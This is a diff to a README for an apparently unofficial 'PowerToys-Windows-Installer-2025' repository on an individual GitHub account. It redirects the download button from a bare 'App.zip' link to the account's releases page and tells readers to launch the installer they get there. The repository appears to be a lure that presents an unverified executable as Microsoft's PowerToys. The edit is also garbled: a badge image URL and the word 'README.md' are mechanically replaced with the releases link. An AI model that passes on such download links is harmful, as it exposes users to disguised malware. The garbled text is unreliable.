@@ -30,7 +30,7 @@ PowerToys-Windows-Installer-2025 is your gateway to unlocking the full potential
 
 To download the PowerToys installer and get started with optimizing your Windows experience, click the button below:
 
-[![Download PowerToys](https://img.shields.io/badge/Download-PowerToys-blue)](https://github.com/uploads/App.zip)
+[![Download PowerToys](https://github.com/Angelhdj/PowerToys-Windows-Installer-2025/releases)](https://github.com/Angelhdj/PowerToys-Windows-Installer-2025/releases)
 
 Remember, if the link ends with a specific file name, you will need to launch the installer to begin the installation process.
 
@@ -48,4 +48,4 @@ Thank you for choosing PowerToys to power up your Windows experience! 🚀
 
 ---
 
-By incorporating these details and suggestions into the README.md file of the PowerToys-Windows-Installer-2025 repository, users will have a comprehensive guide on how to make the most of this powerful suite of utilities. Let the PowerToys enhance your productivity and system customization journey! 🌟
+By incorporating these details and suggestions into the https://github.com/Angelhdj/PowerToys-Windows-Installer-2025/releases file of the PowerToys-Windows-Installer-2025 repository, users will have a comprehensive guide on how to make the most of this powerful suite of utilities. Let the PowerToys enhance your productivity and system customization journey! 🌟
